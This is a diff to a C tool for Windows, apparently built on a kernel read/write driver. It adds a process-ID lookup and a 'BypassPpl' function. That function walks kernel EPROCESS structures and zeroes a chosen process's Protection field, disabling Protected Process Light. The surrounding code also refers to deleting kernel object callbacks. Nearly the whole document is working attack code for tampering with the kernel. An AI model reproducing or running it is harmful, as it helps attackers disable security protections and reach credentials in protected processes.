@@ -119,6 +119,40 @@ VOID SearchModule(ULONG64 Address, ModulesData* module) {
 	return;
 }
 
+// Find PID of a process by its executable name
+DWORD64 FindProcessId(const char* processName) {
+
+	// Convert process name to wide char for comparison
+	size_t wcharCount = mbstowcs(NULL, processName, 0) + 1;
+	wchar_t* wprocessName = (wchar_t*)malloc(wcharCount * sizeof(wchar_t));
+	if (!wprocessName) {
+		return 0;
+	}
+	mbstowcs(wprocessName, processName, wcharCount);
+
+	DWORD64 processId = 0;
+
+	// Take a snapshot of all running processes
+	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (snapshot != INVALID_HANDLE_VALUE) {
+		PROCESSENTRY32 processEntry;
+		processEntry.dwSize = sizeof(PROCESSENTRY32);
+
+		// Iterate through all processes to find a match
+		if (Process32First(snapshot, &processEntry)) {
+			do {
+				if (wcscmp(processEntry.szExeFile, wprocessName) == 0) {
+					processId = processEntry.th32ProcessID;
+					break;
+				}
+			} while (Process32Next(snapshot, &processEntry));
+		}
+		CloseHandle(snapshot);
+	}
+
+	free(wprocessName);
+	return processId;
+}
 
 //		CALLBACK LIST FUNCTIONS
 
@@ -627,4 +661,49 @@ VOID DeleteObjCallback(HANDLE hDevice) {
 
 	}
 	free(entry);
+}
+
+//		VARIOUS
+
+VOID BypassPpl(HANDLE hDevice, DWORD64 pid) {
+	int max_retries = 99999;
+
+	DWORD64 PsInitialSystemProcess = EzPdbGetRva(&pdb, "PsInitialSystemProcess");
+
+	DWORD64 pidOffset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"UniqueProcessId");  // VOID *, HANDLE
+	DWORD64 protectionOffset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"Protection"); // 1 byte
+	DWORD64 activeProcessLinksOffset = EzPdbGetStructPropertyOffset(&pdb, "_EPROCESS", L"ActiveProcessLinks"); // _LIST_ENTRY
+
+	PsInitialSystemProcess += ntoskrnlBase;
+	printf("PsInitialSystemProcess: %llx\n", PsInitialSystemProcess);
+
+	// PsInitialSystemProcess is a pointer so we need to read
+	DWORD64 currPtr = Read64(hDevice,PsInitialSystemProcess);
+
+	while (1) {
+		DWORD64 currPid = Read64(hDevice, currPtr + pidOffset);
+
+		if (currPid == pid) {
+			printf("Process found:\n");
+			break;
+		}
+
+		// this is basically 
+		DWORD64 flink = Read64(hDevice, currPtr + activeProcessLinksOffset);
+
+		if (!flink) {
+			printf("Flink reading failed. it is 0\n");
+			break;
+		}
+		currPtr = flink - activeProcessLinksOffset;
+
+		if (currPtr == PsInitialSystemProcess) {
+			printf("All processes iterated, not found\n");
+			return;
+		}
+	}
+	if (currPtr) {
+		Write64(hDevice, currPtr + protectionOffset, (DWORD64)0x0);
+		printf("Disabled protection for the process\n");
+	}
 }
